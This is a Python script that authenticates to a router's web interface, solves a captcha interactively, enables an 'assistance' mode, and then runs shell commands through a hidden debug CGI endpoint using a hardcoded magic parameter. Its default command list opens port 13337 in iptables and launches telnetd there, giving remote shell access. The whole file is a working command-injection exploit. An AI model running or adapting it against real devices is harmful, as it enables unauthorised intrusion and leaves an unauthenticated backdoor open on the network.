#!/usr/bin/env python3
from dotenv import load_dotenv
import requests
import os

load_dotenv()

# Changable Items
IP_ADDR = os.getenv("IP_ADDR")
WEBUI_USR = os.getenv("WEBUI_USR")
WEBUI_PWD = os.getenv("WEBUI_PWD")
COMMAND_LIST = [
    "iptables -A INPUT -p tcp --dport 13337 -j ACCEPT",
    "/usr/sbin/telnetd -p 13337",
]
VERBOSE = True

if IP_ADDR is None:
    print("IP_ADDR is not set in .env")
    exit(1)

if WEBUI_USR is None:
    print("WEBUI_USR is not set in .env")
    exit(1)

if WEBUI_PWD is None:
    print("WEBUI_PWD is not set in .env")
    exit(1)

# URLs needed
url_service = f"http://{IP_ADDR}/cgi/service.cgi"
url_cmd = f"http://{IP_ADDR}/sess-bin/d.cgi"

referer = f"http://{IP_ADDR}/ui/"

login_req = {
    "method": "session/login",
    "params": {
        "id": WEBUI_USR,
        "pw": WEBUI_PWD,
    },
}
assistance_req = {
    "method": "assistance/config",
    "params": True,
}
captcha_req = {"method": "captcha/new"}
headers_service = {"Content-Type": "application/json", "Referer": referer}

# Create session and login
s = requests.Session()

resp1 = s.post(url_service, headers=headers_service, json=login_req)

# Check if result value is "done" to confirm login if errored, result is null.

if resp1.json().get("result") != "done":
    # Check if captcha is required, "error.message" should be "Insufficient params" and "error.data" array should contain "captcha"
    error_data = resp1.json().get("error")

    if error_data.get(
        "message"
    ) == "Insufficient params" and "captcha" in error_data.get("data", []):
        resp2 = s.post(url_service, headers=headers_service, json=captcha_req)

        captcha_resp = s.post(url_service, headers=headers_service, json=captcha_req)

        captcha_url = captcha_resp.json().get("result").removeprefix("/")
        print(f"Please solve the captcha at: http://{IP_ADDR}/{captcha_url}")

        captcha_value = input("Enter the captcha value: ")
        captcha_value = captcha_value.strip().lower()

        login_req["params"]["captcha"] = {}
        login_req["params"]["captcha"]["text"] = captcha_value
        login_req["params"]["captcha"]["url"] = captcha_url

        relogin_resp = s.post(url_service, headers=headers_service, json=login_req)

        if relogin_resp.json().get("result") != "done":
            print("Login failed after captcha resolution.")
            exit(1)
        else:
            print("Login successful after captcha resolution.")
else:
    print("Login successful.")

# Enable "assistance" to allow command injection
resp3 = s.post(url_service, headers=headers_service, json=assistance_req)

# Execute all command in list
for cmd in COMMAND_LIST:
    cmd_req = {
        "act": "1",
        "fname": "",
        "cmd": cmd,
        "aaksjdkfj": "!@dnjsrurelqjrm*&",
        "dapply": " Show ",
    }
    res = s.get(url_cmd, headers=headers_service, params=cmd_req)
    if VERBOSE:
        print(f"{res.text}")
